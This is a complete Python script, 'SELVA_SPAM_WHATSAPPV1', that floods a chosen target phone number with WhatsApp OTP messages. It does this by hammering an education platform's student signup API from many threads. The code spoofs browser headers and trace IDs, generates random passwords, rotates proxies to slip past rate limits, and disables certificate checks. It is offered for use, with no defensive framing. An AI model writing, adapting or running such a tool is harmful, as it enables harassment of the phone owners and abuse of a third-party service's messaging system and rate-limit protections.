#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import threading
import random
import json
import uuid
import string
from concurrent.futures import ThreadPoolExecutor

# Colors
G = "\033[1;32m"
R = "\033[1;31m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
M = "\033[1;35m"
W = "\033[1;37m"
E = "\033[0m"

# ==================== CONFIGURATION ====================
THREAD_COUNT = 30
DELAY = 0.02  # seconds between requests
USE_PROXY = False
PROXY_LIST = []

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = PROXY_LIST.copy()
        
    def get_proxy(self):
        if not USE_PROXY or not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {"http": proxy, "https": proxy}
    
    def load_from_file(self, filename):
        try:
            with open(filename, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        self.proxies.append(proxy)
            print(f"{G}[✓] Loaded {len(self.proxies)} proxies{E}")
            return True
        except:
            print(f"{R}[!] Failed to load proxies{E}")
            return False

# ==================== HEADER GENERATOR ====================
class HeaderGenerator:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        ]
        
    def generate_trace_id(self):
        return f"guest_user:{uuid.uuid4()}"
    
    def generate_password(self):
        length = random.randint(8, 12)
        chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for _ in range(length))
        if not any(c.isupper() for c in password):
            password = password[0].upper() + password[1:]
        if not any(c.isdigit() for c in password):
            password = password + random.choice(string.digits)
        return password
    
    def get_user_agent(self):
        return random.choice(self.user_agents)
    
    def get_platform(self):
        return random.choice(['web', 'android', 'ios'])
    
    def get_language(self):
        return random.choice(['ar', 'en'])
    
    def get_origin(self):
        return random.choice(['https://abwaab.com', 'https://app.abwaab.com'])
    
    def generate_headers(self):
        lang = self.get_language()
        return {
            'accept': 'application/json',
            'accept-language': f'{lang}-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': self.get_origin(),
            'platform': self.get_platform(),
            'referer': 'https://abwaab.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': random.choice(['?0', '?1']),
            'sec-ch-ua-platform': random.choice(['"Windows"', '"Android"']),
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.get_user_agent(),
            'x-trace-id': self.generate_trace_id(),
        }

# ==================== SPAM WORKER ====================
class SpamWorker:
    def __init__(self, worker_id, phone, proxy_manager, header_gen):
        self.worker_id = worker_id
        self.phone = phone
        self.proxy_manager = proxy_manager
        self.header_gen = header_gen
        self.success_count = 0
        self.fail_count = 0
        self.running = True
        
    def send_request(self):
        try:
            headers = self.header_gen.generate_headers()
            
            json_data = {
                'language': self.header_gen.get_language(),
                'password': self.header_gen.generate_password(),
                'country': '',
                'phone': self.phone,
                'platform': headers.get('platform', 'web'),
                'data': {'Language': headers.get('accept-language', 'ar')[:2]},
                'channel': 'whatsapp',
            }
            
            response = requests.post(
                'https://gw.abgateway.com/student/whatsapp/signup',
                headers=headers,
                json=json_data,
                proxies=self.proxy_manager.get_proxy(),
                timeout=5,
                verify=False
            )
            
            self.success_count += 1
            
            try:
                resp_json = response.json()
                resp_text = str(resp_json).lower()
                
                if 'otp' in resp_text:
                    return True, "✅ OTP SENT"
                elif 'already' in resp_text:
                    return True, "⚠️ ALREADY REG"
                elif 'limit' in resp_text:
                    return False, "🚫 RATE LIMIT"
                elif response.status_code == 200:
                    return True, "✅ SUCCESS"
                else:
                    return False, f"❌ CODE {response.status_code}"
            except:
                if response.status_code == 200:
                    return True, "✅ SUCCESS 200"
                else:
                    return False, f"❌ FAIL {response.status_code}"
                
        except requests.exceptions.Timeout:
            self.fail_count += 1
            return False, "⏱️ TIMEOUT"
        except requests.exceptions.ConnectionError:
            self.fail_count += 1
            return False, "🔌 CONN ERR"
        except Exception as e:
            self.fail_count += 1
            return False, "⚠️ ERROR"
    
    def run(self):
        while self.running:
            success, message = self.send_request()
            
            if success:
                color = G
                prefix = "[+]"
            else:
                color = R
                prefix = "[-]"
            
            print(f"{color}{prefix}[{self.worker_id:02d}] {message} | OK:{self.success_count} ERR:{self.fail_count}{E}")
            time.sleep(DELAY)
        
        return self.success_count, self.fail_count
    
    def stop(self):
        self.running = False

# ==================== MAIN SPAM ENGINE ====================
class SpamCannon:
    def __init__(self):
        self.phone = None
        self.proxy_manager = ProxyManager()
        self.header_gen = HeaderGenerator()
        self.stats = {'success': 0, 'fail': 0}
        self.running = False
        
    def banner(self):
        print(C + """
╔═══════════════════════════════════════════════════════════════════╗
║     SELVA_SPAM_WHATSAPPV1                  ║
║     Threads: """ + str(THREAD_COUNT) + """ | Delay: """ + str(DELAY) + """s                        ║
╚═══════════════════════════════════════════════════════════════════╝
""" + E)
    
    def configure(self):
        self.banner()
        
        # Get phone number
        self.phone = input(f"{Y}[?] Enter target phone number (e.g., 201234567890): {E}")
        
        # Ask for proxy
        global USE_PROXY
        use_proxy = input(f"{Y}[?] Use proxies? (y/n): {E}").lower() == 'y'
        USE_PROXY = use_proxy
        
        if use_proxy:
            proxy_file = input(f"{Y}[?] Enter proxy file path: {E}")
            if proxy_file:
                self.proxy_manager.load_from_file(proxy_file)
        
        # Ask for thread count
        global THREAD_COUNT, DELAY
        try:
            threads = input(f"{Y}[?] Threads (default {THREAD_COUNT}): {E}")
            if threads:
                THREAD_COUNT = int(threads)
        except:
            pass
        
        # Ask for speed
        try:
            speed = input(f"{Y}[?] Requests per second (default {int(1/DELAY)}): {E}")
            if speed:
                rps = int(speed)
                DELAY = 1.0 / rps
        except:
            pass
        
        print(f"\n{G}[✓] Target: {self.phone}{E}")
        print(f"{G}[✓] Threads: {THREAD_COUNT}{E}")
        print(f"{G}[✓] Delay: {DELAY:.4f}s ({int(1/DELAY)} req/sec){E}")
        
        if USE_PROXY:
            print(f"{G}[✓] Proxies: {len(self.proxy_manager.proxies)}{E}")
        
        input(f"\n{Y}[*] Press Enter to start...{E}")
    
    def stats_reporter(self):
        last_success = 0
        last_time = time.time()
        
        while self.running:
            time.sleep(1)
            
            current_time = time.time()
            elapsed = current_time - last_time
            
            if elapsed > 0:
                success_diff = self.stats['success'] - last_success
                rate = success_diff / elapsed
                
                last_success = self.stats['success']
                last_time = current_time
                
                total = self.stats['success'] + self.stats['fail']
                print(f"\r{C}[STATS]{E} | {G}OK:{self.stats['success']:,}{E} | {R}FAIL:{self.stats['fail']:,}{E} | {Y}RATE:{rate:.1f}/s{E} | {B}TOTAL:{total:,}{E}", end="", flush=True)
    
    def run(self):
        self.configure()
        
        print(f"\n{G}[*] Starting {THREAD_COUNT} threads...{E}")
        print(f"{R}[!] Press Ctrl+C to stop{E}\n")
        
        self.running = True
        start_time = time.time()
        
        # Start stats reporter
        stats_thread = threading.Thread(target=self.stats_reporter, daemon=True)
        stats_thread.start()
        
        workers = []
        futures = []
        
        try:
            with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
                for i in range(THREAD_COUNT):
                    worker = SpamWorker(i + 1, self.phone, self.proxy_manager, self.header_gen)
                    workers.append(worker)
                    future = executor.submit(worker.run)
                    futures.append(future)
                
                # Wait for completion or interruption
                for future in futures:
                    try:
                        success, fail = future.result(timeout=0.5)
                        self.stats['success'] += success
                        self.stats['fail'] += fail
                    except:
                        pass
                        
        except KeyboardInterrupt:
            print(f"\n\n{R}[!] Stopping...{E}")
            self.running = False
            
            for worker in workers:
                worker.stop()
            
            time.sleep(1)
            
            # Final stats
            uptime = time.time() - start_time
            total = self.stats['success'] + self.stats['fail']
            rate = total / max(uptime, 1)
            
            print(f"\n{C}{'='*50}{E}")
            print(f"{M}FINAL STATISTICS:{E}")
            print(f"{G}  Success: {self.stats['success']:,}{E}")
            print(f"{R}  Failed: {self.stats['fail']:,}{E}")
            print(f"{Y}  Total: {total:,}{E}")
            print(f"{C}  Avg Rate: {rate:.1f} req/sec{E}")
            print(f"{B}  Uptime: {uptime:.1f} sec{E}")
            print(f"{C}{'='*50}{E}")
            print(f"{G}[✓] Attack finished!{E}")

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        cannon = SpamCannon()
        cannon.run()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user{E}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{E}")